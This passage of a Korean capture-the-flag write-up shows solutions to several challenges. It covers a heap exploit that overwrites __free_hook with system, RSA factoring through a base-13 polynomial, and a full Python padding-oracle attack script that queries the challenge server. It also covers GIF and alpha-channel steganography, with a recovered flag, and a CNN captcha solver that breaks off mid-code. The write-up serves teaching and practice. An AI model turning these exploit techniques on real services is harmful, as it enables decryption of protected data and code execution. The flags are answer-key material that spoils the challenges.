        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc @ {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)))</span>
    <span class="k">elif</span> <span class="s">'infected'</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="n">cnt</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">print</span><span class="p">(</span><span class="n">cnt</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">cnt</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
            <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' was '</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">';'</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="n">split</span><span class="p">(</span><span class="s">'_'</span><span class="p">)</span>
            <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'5'</span><span class="p">)</span>
            <span class="n">hidden</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">+</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">]</span><span class="o">-</span><span class="mh">0x10</span><span class="p">))</span> <span class="c1">#free_hook-0x10
</span>            <span class="n">create</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x60</span><span class="p">)</span>
            <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">+</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">#system
</span>            <span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">'X'</span><span class="p">)</span>
            <span class="k">break</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><br></p>

<p><br></p>

<h1 id="️-crypto">
<a class="anchor" href="#%EF%B8%8F-crypto" aria-hidden="true"><span class="octicon octicon-link"></span></a>🖥️ CRYPTO</h1>

<h2 id="easy-rsa">
<a class="anchor" href="#easy-rsa" aria-hidden="true"><span class="octicon octicon-link"></span></a>Easy RSA</h2>

<hr>

<p><img src="/assets/bob/bob977.png" alt="/assets/bob/bob977.png"></p>

<p>Easy polynomial factoring</p>

<ul>
  <li>문제에서는 공개키만 제공된다. 즉 이 문제에서는 N을 factorization하는 게 목표이다.</li>
  <li>code에서 N의 값을 13진법으로 살펴보라는 힌트가 주어졌다.</li>
  <li>N을 base 13으로 살펴보면 아래와 같다.</li>
</ul>

<p><code class="highlighter-rouge">1100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013a41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019bba2</code></p>

<ul>
  <li>이를 다항식으로 나타내면 아래와 같다.</li>
</ul>

<p><code class="highlighter-rouge">x^400 + x^399 + x^203 + 3*x^202 + 10*x^201 + 4*x^200 + x^199 + x^5 + 9*x^4 + 11*x^3 + 11*x^2 + 10*x + 2 (x=13)</code></p>

<ul>
  <li>sage에서 해당 다항식을 <code class="highlighter-rouge">poly.factor()</code>로 factorization하면 p와 q를 구할 수 있다.</li>
</ul>

<p><strong>Exploit Code</strong></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sage</span><span class="p">:</span> <span class="n">N</span> <span class="o">=</span> <span class="mi">4069355261174518447044221465092549731956949577068389562886621536859114995157407396913103746675307806861475505196604075690189887011157213</span>
<span class="p">....:</span> <span class="mi">06579441204391802579988679325559464933524679569288946633797366876605906618330862289486089133036525973648043594211930902803789362401571187621</span>
<span class="p">....:</span> <span class="mi">75215559436614871795165204002781471609204034064252028413035000407848466271441883438192490960762478416146403426890827177153457241880068131862</span>
<span class="p">....:</span> <span class="mi">173969477923674349247844851493</span>
<span class="n">sage</span><span class="p">:</span> 
<span class="n">sage</span><span class="p">:</span> <span class="n">N</span><span class="p">.</span><span class="nb">str</span><span class="p">(</span><span class="n">base</span><span class="o">=</span><span class="mi">13</span><span class="p">)</span>
<span class="s">'1100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013a41000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000019bba2'</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">poly</span> <span class="o">=</span> <span class="nb">sum</span><span class="p">(</span><span class="n">e</span> <span class="o">*</span> <span class="n">x</span><span class="o">^</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span><span class="p">,</span><span class="n">e</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">N</span><span class="p">.</span><span class="n">digits</span><span class="p">(</span><span class="mi">13</span><span class="p">)))</span>
<span class="n">sage</span><span class="p">:</span> 
<span class="n">sage</span><span class="p">:</span> <span class="n">poly</span>
<span class="n">x</span><span class="o">^</span><span class="mi">400</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">399</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">203</span> <span class="o">+</span> <span class="mi">3</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">202</span> <span class="o">+</span> <span class="mi">10</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">201</span> <span class="o">+</span> <span class="mi">4</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">200</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">199</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">5</span> <span class="o">+</span> <span class="mi">9</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">4</span> <span class="o">+</span> <span class="mi">11</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">3</span> <span class="o">+</span> <span class="mi">11</span><span class="o">*</span><span class="n">x</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">10</span><span class="o">*</span><span class="n">x</span> <span class="o">+</span> <span class="mi">2</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">poly</span><span class="p">.</span><span class="n">factor</span><span class="p">()</span>
  <span class="o">***</span>   <span class="nb">Warning</span><span class="p">:</span> <span class="n">increasing</span> <span class="n">stack</span> <span class="n">size</span> <span class="n">to</span> <span class="mf">2000000.</span>
<span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="mi">200</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">199</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="n">x</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="n">x</span><span class="o">^</span><span class="mi">200</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">3</span> <span class="o">+</span> <span class="n">x</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="n">x</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">p</span> <span class="o">=</span> <span class="mi">13</span><span class="o">^</span><span class="mi">200</span> <span class="o">+</span> <span class="mi">13</span><span class="o">^</span><span class="mi">199</span> <span class="o">+</span> <span class="mi">13</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">13</span> <span class="o">+</span> <span class="mi">2</span>
<span class="n">sage</span><span class="p">:</span> <span class="n">q</span> <span class="o">=</span> <span class="mi">13</span><span class="o">^</span><span class="mi">200</span> <span class="o">+</span> <span class="mi">13</span><span class="o">^</span><span class="mi">3</span> <span class="o">+</span> <span class="mi">13</span><span class="o">^</span><span class="mi">2</span> <span class="o">+</span> <span class="mi">13</span> <span class="o">+</span> <span class="mi">1</span>
</code></pre></div></div>

<p><br></p>

<p><br></p>

<h2 id="boom-boom">
<a class="anchor" href="#boom-boom" aria-hidden="true"><span class="octicon octicon-link"></span></a>Boom Boom</h2>

<hr>

<p><img src="/assets/bob/bob978.png" alt="/assets/bob/bob978.png"></p>

<p>Oracle Padding Attack</p>

<p><img src="/assets/bob/bob979.png" alt="/assets/bob/bob979.png"></p>

<p><strong>문제확인</strong></p>

<blockquote>
  <p>테러단체에서 폭탄테러가 있을 예정이라는 첩보를 입수했다….(생략)… 암호문을 복호화하고 암호 해제 비밀번호를 획득해라!</p>
</blockquote>

<ul>
  <li>문제에 접속하면 메시지와 함께 IV와 Ciphertext를 확인할 수 있다.</li>
  <li>페이지에 새로 접속할 때마다 새로운 IV와 Ciphertext를 출력해준다.</li>
</ul>

<p><strong>기능확인</strong></p>

<p><img src="/assets/bob/bob980.png" alt="/assets/bob/bob980.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">Module</code> 페이지에서는 <code class="highlighter-rouge">IV</code>와 <code class="highlighter-rouge">Ciphertext</code>를 입력할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob981.png" alt="/assets/bob/bob981.png"></p>

<ul>
  <li>
<code class="highlighter-rouge">Flag</code> 페이지에서는 <code class="highlighter-rouge">Passcode</code>를 입력할 수 있다. 올바른 <code class="highlighter-rouge">Passcode</code>를 입력하면 <code class="highlighter-rouge">FlAG</code>를 출력한다.</li>
</ul>

<p><strong>분석</strong></p>

<ul>
  <li>Module 페이지에서는 총 3가지의 응답이 존재한다.</li>
</ul>

<p><img src="/assets/bob/bob982.png" alt="/assets/bob/bob982.png"></p>

<p><strong>1) Invalid padding</strong></p>

<ul>
  <li>IV가 알맞지 않을 경우 발생(Padding error)</li>
</ul>

<p><img src="/assets/bob/bob983.png" alt="/assets/bob/bob983.png"></p>

<p><img src="/assets/bob/bob984.png" alt="/assets/bob/bob984.png"></p>

<p><strong>2) incoreect!</strong></p>

<ul>
  <li>Padding은 알맞게 채워진 경우</li>
</ul>

<p><img src="/assets/bob/bob985.png" alt="/assets/bob/bob985.png"></p>

<p><strong>3) correct!</strong></p>

<ul>
  <li>IV와 Ciphertext 모두 알맞을 경우 발생</li>
</ul>

<p><strong>Oracle Padding Attack 개념</strong></p>

<ul>
  <li>취약점 설명
    <ul>
      <li>블록암호에서 사용되는 패딩이, 올바른지 올바르지 않은지에 따라 서버의 응답이 달라질 경우 이를 통해 공격을 수행 할 수 있다.</li>
    </ul>
  </li>
  <li>패딩이란?
    <ul>
      <li>블록 암호화해서 사용하는 것으로, 일정 단위로 블록을 자를때 마지막 블록에 앞 블록과 같은 길이로 만들어주기 위해 남는 곳은 패딩으로 채운다.</li>
    </ul>

    <p><img src="/assets/bob/bob986.png" alt="/assets/bob/bob986.png"></p>

    <ul>
      <li>오라클 패딩의 경우, 5byte가 남았으면 0x05로 5byte를 채우고 2byte가 남았으면 0x02로 2byte를 채운다.</li>
      <li>만약 평문이 8byte일 경우 다음 블록을 모두 0x08로 8byte 채운다.</li>
    </ul>
  </li>
</ul>

<p><img src="/assets/bob/bob987.png" alt="/assets/bob/bob987.png"></p>

<ul>
  <li>암호화를 수행하는 과정은 위 그림과 같다.</li>
  <li>iv와 plain text를 xor 하여 Intermediary Value를 얻고 그 값을 3DES 암호화 방식을 거쳐 암호문으로 나온다.</li>
  <li>이후 그 암호문을 iv로 사용한다.</li>
  <li>즉 암호문은, IV+암호블럭1+암호블럭2로 이뤄진다.</li>
</ul>

<p><img src="/assets/bob/bob988.png" alt="/assets/bob/bob988.png"></p>

<ul>
  <li>복호화 과정을 살펴보면 위 그림과 같다. 암호문을 3DES로 복호화 하여 Intermediary Value 값을 얻는다.</li>
  <li>이후 IV와 Intermediary Value를 XOR 하여 plain 값을 얻는다.</li>
</ul>

<p><img src="/assets/bob/bob989.png" alt="/assets/bob/bob989.png"></p>

<ul>
  <li>IV와 Intermediary Value 값을 XOR 한 plain 블럭의 마지막 값(패딩 부분)이 0x01이 되는 IV 마지막 값 찾고, 0x01과 그 IV 마지막 값을 XOR 하면 Intermediary의 마지막 값을 알 수 있다.</li>
  <li>동일한 방식으로 0x01 부터 0x08까지 패딩을 가정하여 IV 값을 변경하며 서버로 요청을 수행하고, invalid 응답을 경우의 값을 iv로 두고 그때의 패딩 값과 xor 하여 intermediary value 값을 얻을 수 있고 intermediary value 값과 이미 알고있는 iv 값을 xor 하여 plain 값을 얻을 수 있다.</li>
</ul>

<p><strong>FlAG 획득!</strong></p>

<p>Exploit code</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">base64</span>
<span class="kn">from</span> <span class="nn">urllib.parse</span> <span class="kn">import</span> <span class="n">quote</span><span class="p">,</span> <span class="n">unquote</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">urllib3.util.retry</span> <span class="kn">import</span> <span class="n">Retry</span>
<span class="kn">from</span> <span class="nn">requests.adapters</span> <span class="kn">import</span> <span class="n">HTTPAdapter</span>
<span class="kn">from</span> <span class="nn">collections</span> <span class="kn">import</span> <span class="n">OrderedDict</span>
<span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">from</span> <span class="nn">requests.packages.urllib3.exceptions</span> <span class="kn">import</span> <span class="n">InsecureRequestWarning</span>
<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">(</span><span class="n">InsecureRequestWarning</span><span class="p">)</span>

<span class="c1"># paload send
</span><span class="k">def</span> <span class="nf">send_payload</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">payload_iv</span><span class="p">,</span> <span class="n">payload_ciphertext</span><span class="p">):</span>
    <span class="c1"># variable initialization
</span>	<span class="n">url</span> <span class="o">=</span> <span class="s">""</span>
	<span class="n">headers</span> <span class="o">=</span> <span class="p">{}</span>
	<span class="n">params</span> <span class="o">=</span> <span class="p">{}</span>
	<span class="n">data</span> <span class="o">=</span> <span class="p">{}</span>

    <span class="c1"># URL setting
</span>	<span class="n">url</span> <span class="o">=</span> <span class="s">'http://1-star.kr/onestar/padding/module.php'</span>

    <span class="c1"># params setting
</span>	<span class="n">params</span> <span class="o">=</span> <span class="p">{</span><span class="s">'iv'</span><span class="p">:</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload_iv</span><span class="p">),</span> <span class="s">'ciphertext'</span><span class="p">:</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">payload_ciphertext</span><span class="p">)}</span>

    <span class="c1"># data setting
</span>	<span class="n">data</span> <span class="o">=</span> <span class="n">OrderedDict</span><span class="p">()</span>

    <span class="c1"># send packet
</span>	<span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
	<span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>

<span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
	<span class="n">output</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
	<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">ch</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
		<span class="n">output</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">ch</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>
	<span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>

<span class="c1"># hex
</span><span class="k">def</span> <span class="nf">hex_view</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
	<span class="n">temp</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="nb">hex</span><span class="p">()</span>
	<span class="n">ret</span> <span class="o">=</span> <span class="s">""</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">temp</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
		<span class="n">ret</span> <span class="o">+=</span> <span class="n">temp</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span> <span class="o">+</span> <span class="s">" "</span>
	<span class="k">return</span> <span class="n">ret</span>

<span class="n">iv</span><span class="o">=</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">unquote</span><span class="p">(</span><span class="s">"QjA2bGwxVTM%3D"</span><span class="p">))</span>
<span class="n">enc</span><span class="o">=</span><span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">unquote</span><span class="p">(</span><span class="s">"EJA3gltQjV4%3D"</span><span class="p">))</span>
<span class="n">inter</span><span class="o">=</span><span class="s">b''</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>

<span class="k">print</span><span class="p">(</span><span class="s">"I V =&gt; {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">hex_view</span><span class="p">(</span><span class="n">iv</span><span class="p">)))</span>
<span class="k">print</span><span class="p">(</span><span class="s">"ENC =&gt; {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">hex_view</span><span class="p">(</span><span class="n">enc</span><span class="p">)))</span>

<span class="c1">#make iv 1~len(iv)+1 
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">iv</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
	<span class="k">print</span> <span class="p">(</span><span class="s">"==========================================="</span><span class="p">)</span>
	<span class="k">print</span> <span class="p">(</span><span class="s">"i: "</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
	<span class="n">start</span> <span class="o">=</span> <span class="n">iv</span><span class="p">[:</span><span class="nb">len</span><span class="p">(</span><span class="n">iv</span><span class="p">)</span><span class="o">-</span><span class="n">i</span><span class="p">]</span>
	<span class="k">print</span> <span class="p">(</span><span class="s">"start: "</span><span class="p">,</span> <span class="n">hex_view</span><span class="p">(</span><span class="n">start</span><span class="p">))</span>
	<span class="k">print</span> <span class="p">(</span><span class="s">"bytes([i]): "</span><span class="p">,</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">i</span><span class="p">]))</span>
	<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mh">0xff</span><span class="o">+</span><span class="mi">1</span><span class="p">):</span>
		<span class="k">print</span> <span class="p">(</span><span class="s">"j: "</span><span class="p">,</span><span class="n">j</span><span class="p">)</span>
		<span class="n">target</span> <span class="o">=</span> <span class="n">start</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">j</span><span class="p">])</span> <span class="o">+</span> <span class="n">xor</span><span class="p">(</span><span class="n">inter</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">i</span><span class="p">]))</span>
		<span class="n">res</span> <span class="o">=</span> <span class="n">send_payload</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">target</span><span class="p">,</span> <span class="n">enc</span><span class="p">)</span>
		<span class="k">print</span><span class="p">(</span><span class="s">"target: "</span><span class="p">,</span> <span class="n">hex_view</span><span class="p">(</span><span class="n">target</span><span class="p">),</span> <span class="s">"=&gt;"</span><span class="p">,</span> <span class="n">target</span><span class="p">)</span>
		<span class="c1">#print(hex_view(enc), "=&gt;", enc)
</span>		<span class="c1">#print(res)
</span>		<span class="k">if</span> <span class="s">'Invalid padding.'</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">res</span><span class="p">:</span>
			<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
			<span class="k">break</span>
	<span class="n">inter</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">i</span> <span class="o">^</span> <span class="n">j</span><span class="p">])</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"inter: "</span><span class="p">,</span> <span class="n">hex_view</span><span class="p">(</span><span class="n">inter</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
	<span class="k">print</span><span class="p">(</span><span class="s">"inter: "</span><span class="p">,</span> <span class="n">hex_view</span><span class="p">(</span><span class="n">inter</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>

<span class="c1"># inter xor iv =&gt; plain
</span><span class="n">inter</span> <span class="o">=</span> <span class="n">inter</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
<span class="n">plain</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">inter</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="s">"plain =&gt;"</span><span class="p">,</span> <span class="n">plain</span><span class="p">)</span>
</code></pre></div></div>

<p><img src="/assets/bob/bob990.png" alt="/assets/bob/bob990.png"></p>

<p><img src="/assets/bob/bob991.png" alt="/assets/bob/bob991.png"></p>

<p><br></p>

<p><br></p>

<h1 id="️-misc">
<a class="anchor" href="#%EF%B8%8F-misc" aria-hidden="true"><span class="octicon octicon-link"></span></a>🖥️ MISC</h1>

<h2 id="gift">
<a class="anchor" href="#gift" aria-hidden="true"><span class="octicon octicon-link"></span></a>‘gif’t</h2>

<hr>

<p>문제에 대한 간단 설명</p>

<p><img src="/assets/bob/bob992.png" alt="/assets/bob/bob992.png"></p>

<p>easy gif misc</p>

<ul>
  <li>문제의 그림에서 gif 그림을 보면 반짝이는 글자가 두 위치에서 반짝이는 것을 볼 수 있다. 이 그림이 문제 파일이다.</li>
</ul>

<p><img src="/assets/bob/bob993.png" alt="/assets/bob/bob993.png"></p>

<ul>
  <li>이 gif 파일을 보면 16진수로 두 개의 글자가 왔다갔다 하는 것을 볼 수 있다.</li>
  <li>풀이하는 방법은 다양하게 있을 수 있기 때문에 하나하나 설명하지 않고, 파일 내부의 gif 구성을 보여주도록 하겠다.</li>
</ul>

<p><img src="/assets/bob/bob994.png" alt="/assets/bob/bob994.png"></p>

<ul>
  <li>위와 같이 이미지를 볼 수 있는데, 이를 쭈욱 따라 작성하여 16진수를 ascii로 변환하게 되면 flag를 얻을 수 있는 간단한 문제다.</li>
</ul>

<p><br></p>

<p><br></p>

<h2 id="hide-and-seek">
<a class="anchor" href="#hide-and-seek" aria-hidden="true"><span class="octicon octicon-link"></span></a>Hide And Seek</h2>

<hr>

<p><img src="/assets/bob/bob995.png" alt="/assets/bob/bob995.png"></p>

<p>이 문제에서는 stego.png 파일이 주어진다. 주어진 파일의 이름에 나타나듯 Stegography 문제의 일종으로 파악할 수 있다.
문제의 이미지를 잘 보면 아래 검은색 영역에 초록색 점들이 일부 나타나는 것을 확인할 수 있다. 이 문제는 이미지의 PIXEL을 구성하는 구분 값 R,G,B,A 중 A 값(투명도)을 활용하여 Flag를 추출하는 문제다.</p>

<ul>
  <li>주어진 이미지에서 A값(투명도)가 0xFF가 아닌 좌표들과 그 좌표에 해당하는 Pixel의 R,G,B,A 값들을 추출하면 아래와 같다.</li>
</ul>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(x,y) =&gt; (r,g,b,a)
===============================
(1,416)	=&gt; (13,110,20,170)	=&gt; 'n'
(32,1172)	=&gt; (0,103,0,167)	=&gt; 'g'
(45,967)	=&gt; (15,105,24,163)	=&gt; 'i'
(113,1004)	=&gt; (17,71,28,172)	=&gt; 'G'
(160,1010)	=&gt; (17,66,26,174)	=&gt; 'B'
(161,704)	=&gt; (16,116,25,176)	=&gt; 't'
(192,110)	=&gt; (17,70,35,154)	=&gt; 'F'
(289,983)	=&gt; (17,98,28,152)	=&gt; 'b'
(301,736)	=&gt; (17,95,26,173)	=&gt; '_'
(312,1265)	=&gt; (0,103,0,157)	=&gt; 'g'
(359,887)	=&gt; (17,64,27,156)	=&gt; '@'
(395,600)	=&gt; (202,95,163,161)	=&gt; '_'
(415,45)	=&gt; (18,105,36,175)	=&gt; 'i'
(445,1106)	=&gt; (17,98,33,150)	=&gt; 'b'
(453,256)	=&gt; (202,105,163,169)	=&gt; 'i'
(456,783)	=&gt; (18,105,30,159)	=&gt; 'i'
(480,433)	=&gt; (31,95,57,171)	=&gt; '_'
(533,833)	=&gt; (20,110,34,166)	=&gt; 'n'
(557,90)	=&gt; (25,95,44,168)	=&gt; '_'
(643,1106)	=&gt; (17,111,33,151)	=&gt; 'o'
(668,818)	=&gt; (17,123,27,153)	=&gt; '{'
(674,677)	=&gt; (30,105,34,165)	=&gt; 'i'
(686,55)	=&gt; (18,100,36,164)	=&gt; 'd'
(801,54)	=&gt; (17,108,35,155)	=&gt; 'l'
(917,292)	=&gt; (18,36,35,177)	=&gt; '$'
(968,574)	=&gt; (15,72,25,162)	=&gt; 'H'
(970,1039)	=&gt; (0,125,0,178)	=&gt; '}'
(972,801)	=&gt; (17,95,29,158)	=&gt; '_'
(987,922)	=&gt; (17,115,26,160)	=&gt; 's'
</code></pre></div></div>

<ul>
  <li>위 값들에서 중요한 값들은 G에 해당하는 값들과 A에 해당하는 값들이다.</li>
  <li>G는 Flag의 각 문자들을 의미하며, A는 문자들의 Index를 의미한다.</li>
  <li>G 값들을 A의 값에 따라 나열하면 Flag를 추출할 수 있다.</li>
  <li><strong>Flag : bob{Fl@g_is_Hiding_in_G_Bit$}</strong></li>
</ul>

<p><br></p>

<p><br></p>

<h2 id="catcha">
<a class="anchor" href="#catcha" aria-hidden="true"><span class="octicon octicon-link"></span></a>Catcha</h2>

<hr>

<p><img src="/assets/bob/bob996.png" alt="/assets/bob/bob996.png"></p>

<p>약 5만장의 강아지와 고양이 사진이 랜덤으로 나오며, 1초 안에 사진에 나온 동물이 강아지인지 고양이인지 맞춰야 하는 captcha solver 문제입니다. 300개의 스테이지를 모두 클리어하면 플래그를 획득할 수 있다.</p>

<p>출제 의도는 일종의 ‘<code class="highlighter-rouge">자동 의사 결정기</code>‘를 만들 수 있는가?’ 이다.</p>

<p>의도했던 풀이는 사실 <code class="highlighter-rouge">CNN과 GAN을 적절히 섞어 하나의 앙상블 모델을 컴파일하고 주어진 데이터셋으로 학습 후 정답을 예측</code>하는 것이였으나,  문제의 난이도를 하향 조절 하다 보니(…) 문제에 제공되는 데이터셋을 전부 제공하게 되었고, 그로 인해 따로 모델을 컴파일하지 않고 주어진 데이터셋으로 일종의 hash table을 만들어 문제를 풀이할 수 있다.</p>

<h3 id="머신러닝으로-풀기">머신러닝으로 풀기</h3>

<p>분류해야 할 데이터가 이미지이기 때문에 <code class="highlighter-rouge">CNN(Convolutional Neural Network) 모델</code>을 사용한다. 주어진 데이터셋의 이미지 사이즈가 모두 제각각이기 때문에 어느정도의 preprocessing 이 필요하다. 또한 훈련의 연산량을 줄여 훈련 효율을 높이기 위해 이미지를 grayscale로 변환했다.</p>

<ol>
  <li>
    <p>이미지 전처리 (Preprocessing)</p>

    <div class="language-python highlighter-rouge">
<div class="highlight"><pre class="highlight"><code> <span class="kn">import</span> <span class="nn">numpy</span> <span class="k">as</span> <span class="n">np</span>
 <span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="n">pd</span>
 <span class="kn">import</span> <span class="nn">cv2</span>
 <span class="kn">import</span> <span class="nn">tensorflow</span> <span class="k">as</span> <span class="n">tf</span>
 <span class="kn">from</span> <span class="nn">tensorflow.keras.models</span> <span class="kn">import</span> <span class="n">Sequential</span>
 <span class="kn">from</span> <span class="nn">tensorflow.keras.layers</span> <span class="kn">import</span> <span class="n">Dense</span><span class="p">,</span> <span class="n">Flatten</span><span class="p">,</span> <span class="n">Dropout</span><span class="p">,</span> <span class="n">Activation</span><span class="p">,</span> <span class="n">Conv2D</span><span class="p">,</span> <span class="n">MaxPooling2D</span>

 <span class="n">path</span> <span class="o">=</span> <span class="s">'./dataset/train'</span>

 <span class="n">X</span> <span class="o">=</span> <span class="p">[]</span>
 <span class="n">y</span> <span class="o">=</span> <span class="p">[]</span> <span class="c1"># target
</span> <span class="n">convert</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">category</span> <span class="p">:</span> <span class="nb">int</span><span class="p">(</span><span class="n">category</span> <span class="o">==</span> <span class="s">'dog'</span><span class="p">)</span>

 <span class="k">def</span> <span class="nf">preprocess</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
